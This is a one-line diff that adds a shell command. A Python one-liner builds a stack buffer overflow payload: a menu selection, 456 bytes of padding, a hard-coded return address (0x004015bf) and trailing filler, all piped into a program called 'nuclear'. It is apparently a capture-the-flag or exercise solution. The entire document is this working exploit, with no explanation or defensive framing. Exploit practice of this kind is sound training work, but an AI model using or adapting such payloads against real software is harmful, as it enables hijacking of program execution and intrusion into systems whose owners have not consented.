@@ -1,0 +1,1 @@
+python -c "print('\n2\n'+'A'*456+'\xbf\x15\x40\x00'+'B'*12)" | nuclear
